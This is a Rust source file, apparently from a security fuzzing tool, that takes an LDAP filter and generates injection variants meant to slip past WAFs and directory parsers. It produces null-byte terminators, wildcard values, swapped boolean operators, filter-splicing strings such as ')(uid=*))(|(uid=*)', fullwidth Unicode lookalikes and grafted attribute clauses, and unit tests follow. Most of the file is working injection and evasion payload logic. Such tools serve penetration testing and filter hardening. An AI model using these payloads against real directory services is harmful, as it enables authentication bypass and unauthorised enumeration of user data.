//! LDAP grammar-aware payload mutation.
//!
//! Generates semantic-preserving LDAP filter mutations that keep the same
//! general intent while rotating syntax features commonly handled
//! inconsistently by WAFs and directory parsers.
//!
//! # Strategies
//!
//! 1. Null-byte termination after the original payload
//! 2. Wildcard substitution for filter values
//! 3. Boolean operator confusion between `|`, `&`, and `!`
//! 4. Parenthesis-balancing filter splicing
//! 5. Unicode lookalike replacement for ASCII filter characters
//! 6. Comment-style filter-close injection with `%00`
//! 7. Attribute grafting by appending extra clauses

use std::collections::BTreeSet;

/// Generate semantic-preserving LDAP mutations for a candidate payload.
#[must_use]
pub fn mutate(payload: &str) -> Vec<String> {
    if payload.is_empty() || !detect_type(payload) {
        return Vec::new();
    }

    let mut results = BTreeSet::new();

    results.insert(format!("{payload}\u{0000}"));
    results.insert(format!("{payload})(%00"));
    results.insert(format!("{payload})(mail=*)"));
    results.insert(")(uid=*))(|(uid=*)".to_string());

    add_wildcard_variants(payload, &mut results);
    add_boolean_variants(payload, &mut results);
    add_unicode_variants(payload, &mut results);
    add_balancing_variants(payload, &mut results);

    results.remove(payload);
    results.into_iter().collect()
}

/// Detect whether a payload looks like an LDAP filter or LDAP injection probe.
#[must_use]
pub fn detect_type(payload: &str) -> bool {
    let lower = payload.to_ascii_lowercase();
    let signals = [
        payload.contains('('),
        payload.contains(')'),
        payload.contains('|'),
        payload.contains('&'),
        payload.contains('*'),
        lower.contains("uid="),
        lower.contains("cn="),
        lower.contains("objectclass="),
    ];

    signals.into_iter().filter(|signal| *signal).count() >= 2
}

fn add_wildcard_variants(payload: &str, results: &mut BTreeSet<String>) {
    let attributes = ["uid=", "cn=", "mail=", "objectClass=", "objectclass="];
    let mut replaced_any = false;

    for attribute in attributes {
        if let Some(mutated) = wildcard_attribute(payload, attribute) {
            replaced_any = true;
            results.insert(mutated);
        }
    }

    if !replaced_any && payload.contains('=') {
        let mut chars = payload.chars().peekable();
        let mut mutated = String::with_capacity(payload.len());
        let mut in_value = false;

        while let Some(ch) = chars.next() {
            mutated.push(ch);
            if ch == '=' {
                in_value = true;
                continue;
            }
            if in_value {
                while let Some(next) = chars.peek() {
                    if matches!(*next, ')' | '(' | '&' | '|') {
                        break;
                    }
                    let _ = chars.next();
                }
                if !mutated.ends_with('*') {
                    mutated.push('*');
                }
                in_value = false;
            }
        }

        results.insert(mutated);
    }
}

fn wildcard_attribute(payload: &str, attribute: &str) -> Option<String> {
    let start = payload.find(attribute)?;
    let value_start = start + attribute.len();
    let value_end = payload[value_start..]
        .find([')', '&', '|', '('])
        .map_or(payload.len(), |offset| value_start + offset);

    let mut mutated = String::with_capacity(payload.len() + 1);
    mutated.push_str(&payload[..value_start]);
    mutated.push('*');
    mutated.push_str(&payload[value_end..]);
    Some(mutated)
}

fn add_boolean_variants(payload: &str, results: &mut BTreeSet<String>) {
    if payload.contains('|') {
        results.insert(payload.replace('|', "&"));
    }
    if payload.contains('&') {
        results.insert(payload.replace('&', "|"));
    }

    let not_wrapped = if payload.starts_with("!(") {
        payload.to_string()
    } else if payload.starts_with('(') {
        format!("!{payload}")
    } else {
        format!("!({payload})")
    };
    results.insert(not_wrapped);
}

fn add_unicode_variants(payload: &str, results: &mut BTreeSet<String>) {
    let fullwidth = payload
        .chars()
        .map(map_unicode_equivalent)
        .collect::<String>();
    if fullwidth != payload {
        results.insert(fullwidth);
    }
}

fn map_unicode_equivalent(ch: char) -> char {
    match ch {
        '(' => '（',
        ')' => '）',
        '=' => '＝',
        '*' => '＊',
        '&' => '＆',
        '|' => '｜',
        '!' => '！',
        'a' => 'ａ',
        'c' => 'ｃ',
        'd' => 'ｄ',
        'i' => 'ｉ',
        'l' => 'ｌ',
        'm' => 'ｍ',
        'n' => 'ｎ',
        'o' => 'ｏ',
        's' => 'ｓ',
        't' => 'ｔ',
        'u' => 'ｕ',
        _ => ch,
    }
}

fn add_balancing_variants(payload: &str, results: &mut BTreeSet<String>) {
    if payload.contains('(') || payload.contains(')') {
        results.insert(format!(")(uid=*))(|(uid=*){payload}"));
        results.insert(format!("{payload})(uid=*))(|(uid=*)"));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_uid_filter() {
        assert!(detect_type("(uid=admin)"));
    }

    #[test]
    fn detects_boolean_filter() {
        assert!(detect_type("(|(cn=admin)(mail=*))"));
    }

    #[test]
    fn rejects_non_ldap_payload() {
        assert!(!detect_type("plain text value"));
    }

    #[test]
    fn generates_null_byte_variant() {
        let mutations = mutate("(uid=admin)");
        assert!(mutations.iter().any(|item| item.ends_with('\u{0000}')));
    }

    #[test]
    fn generates_wildcard_variant() {
        let mutations = mutate("(uid=admin)");
        assert!(mutations.iter().any(|item| item.contains("(uid=*)")));
    }

    #[test]
    fn generates_boolean_confusion_variants() {
        let mutations = mutate("(|(uid=admin)(cn=admin))");
        assert!(mutations.iter().any(|item| item.contains('&')));
        assert!(mutations.iter().any(|item| item.starts_with('!')));
    }

    #[test]
    fn generates_balancing_attack_variant() {
        let mutations = mutate("(uid=admin)");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains(")(uid=*))(|(uid=*)"))
        );
    }

    #[test]
    fn generates_unicode_variant() {
        let mutations = mutate("(uid=admin)");
        assert!(mutations.iter().any(|item| item.contains('（')));
    }

    #[test]
    fn generates_comment_close_variant() {
        let mutations = mutate("(uid=admin)");
        assert!(mutations.iter().any(|item| item.ends_with(")(%00")));
    }

    #[test]
    fn generates_attribute_injection_variant() {
        let mutations = mutate("(uid=admin)");
        assert!(mutations.iter().any(|item| item.ends_with(")(mail=*)")));
    }
}
